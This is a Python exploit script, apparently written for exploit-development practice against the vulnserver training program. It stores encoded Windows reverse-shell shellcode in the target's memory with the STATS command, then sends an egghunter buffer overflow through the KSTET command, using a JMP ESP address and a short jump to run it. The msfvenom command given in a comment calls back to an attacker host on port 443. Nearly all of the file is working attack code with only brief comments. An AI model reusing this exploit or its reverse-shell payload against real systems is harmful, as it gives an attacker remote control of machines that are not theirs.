#!/usr/bin/python3
# Python egghunter script for use against vulnserver (for testing purposes)
import os
import sys, socket
import traceback

if (len(sys.argv) != 3):
    print(f"usage: python3 {sys.argv[0]} <targetIP> <port>")
    sys.exit(0)
##

# Unedited bad chars list
#badchars = (
#    "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
#    "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
#    "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
#    "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
#    "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
#    "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
#    "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
#    "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
#)


badchars = (
    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
    "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

ip = sys.argv[1]
port = int(sys.argv[2])

# msfvenom -a x86 -p windows/shell_reverse_tcp lhost=<attackerIP> lport=443 -e x86/shikata_ga_nai EXITFUNC=thread -f python -v shellcode
# payload size: 351 bytes
shellcode =  ""
shellcode += "\xb8\x33\xae\x23\x70\xdb\xd1\xd9\x74\x24\xf4"
shellcode += "\x5b\x29\xc9\xb1\x52\x31\x43\x12\x03\x43\x12"
shellcode += "\x83\xd8\x52\xc1\x85\xe2\x43\x84\x66\x1a\x94"
shellcode += "\xe9\xef\xff\xa5\x29\x8b\x74\x95\x99\xdf\xd8"
shellcode += "\x1a\x51\x8d\xc8\xa9\x17\x1a\xff\x1a\x9d\x7c"
shellcode += "\xce\x9b\x8e\xbd\x51\x18\xcd\x91\xb1\x21\x1e"
shellcode += "\xe4\xb0\x66\x43\x05\xe0\x3f\x0f\xb8\x14\x4b"
shellcode += "\x45\x01\x9f\x07\x4b\x01\x7c\xdf\x6a\x20\xd3"
shellcode += "\x6b\x35\xe2\xd2\xb8\x4d\xab\xcc\xdd\x68\x65"
shellcode += "\x67\x15\x06\x74\xa1\x67\xe7\xdb\x8c\x47\x1a"
shellcode += "\x25\xc9\x60\xc5\x50\x23\x93\x78\x63\xf0\xe9"
shellcode += "\xa6\xe6\xe2\x4a\x2c\x50\xce\x6b\xe1\x07\x85"
shellcode += "\x60\x4e\x43\xc1\x64\x51\x80\x7a\x90\xda\x27"
shellcode += "\xac\x10\x98\x03\x68\x78\x7a\x2d\x29\x24\x2d"
shellcode += "\x52\x29\x87\x92\xf6\x22\x2a\xc6\x8a\x69\x23"
shellcode += "\x2b\xa7\x91\xb3\x23\xb0\xe2\x81\xec\x6a\x6c"
shellcode += "\xaa\x65\xb5\x6b\xcd\x5f\x01\xe3\x30\x60\x72"
shellcode += "\x2a\xf7\x34\x22\x44\xde\x34\xa9\x94\xdf\xe0"
shellcode += "\x7e\xc4\x4f\x5b\x3f\xb4\x2f\x0b\xd7\xde\xbf"
shellcode += "\x74\xc7\xe1\x15\x1d\x62\x18\xfe\xe2\xdb\x22"
shellcode += "\x2c\x8a\x19\x22\xd1\xf0\x97\xc4\xbb\x16\xfe"
shellcode += "\x5f\x54\x8e\x5b\x2b\xc5\x4f\x76\x56\xc5\xc4"
shellcode += "\x75\xa7\x88\x2c\xf3\xbb\x7d\xdd\x4e\xe1\x28"
shellcode += "\xe2\x64\x8d\xb7\x71\xe3\x4d\xb1\x69\xbc\x1a"
shellcode += "\x96\x5c\xb5\xce\x0a\xc6\x6f\xec\xd6\x9e\x48"
shellcode += "\xb4\x0c\x63\x56\x35\xc0\xdf\x7c\x25\x1c\xdf"
shellcode += "\x38\x11\xf0\xb6\x96\xcf\xb6\x60\x59\xb9\x60"
shellcode += "\xde\x33\x2d\xf4\x2c\x84\x2b\xf9\x78\x72\xd3"
shellcode += "\x48\xd5\xc3\xec\x65\xb1\xc3\x95\x9b\x21\x2b"
shellcode += "\x4c\x18\x41\xce\x44\x55\xea\x57\x0d\xd4\x77"
shellcode += "\x68\xf8\x1b\x8e\xeb\x08\xe4\x75\xf3\x79\xe1"
shellcode += "\x32\xb3\x92\x9b\x2b\x56\x94\x08\x4b\x73"

def connect(ip, port, buff):
    try:
        print("[*] Connecting to server...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((ip, port))
        
        print(s.recv(1024))
        print("[+] Connection established")

        print("[+] Sending buffer...")
        # Buffer needs to be a byte-like object in python3
        byteBuffer = buff.encode()
        s.send(byteBuffer)
        #print(s.recv(1024))
        
        s.close()
    except Exception:
        traceback.print_exc()
        sys.exit(0)
    ##
###

# Send the egghunter that will look for our egg and shellcode
def sendEgghunter(ip, port, buff):
    buff = f"KSTET {buff}"
    connect(ip, port, buff)
##

# Store egg and shellcode into the target's memory without crashing the target service
def sendShellcode(ip, port, buff):
    egg = "w00tw00t"
    
    # STATS is a vulnserver command
    buff = f"STATS {egg} {buff}"
    print("[+] Storing egg and shellcode in target's memory...")
    connect(ip, port, buff)
##


def sendBadchars(ip, port, payloadSize):
    buff = badchars + "x"*(payloadSize - len(badchars))
    
    sendShellcode(ip, port, buff)
##


def main():
    jmpEsp = "\xAF\x11\x50\x62"
    # Jump back 50 bytes
    jumpBack = "\xEB\xCE"

    egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
    egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

    buff = "\x90" * 20
    buff += egghunter
    buff += "\x90" * (70 - len(buff))
    buff += jmpEsp
    buff += jumpBack
    buff += "C" * 20

    sendShellcode(ip, port, shellcode)
    sendEgghunter(ip, port, buff)
    #sendBadchars(ip, port, 600)
##

main()
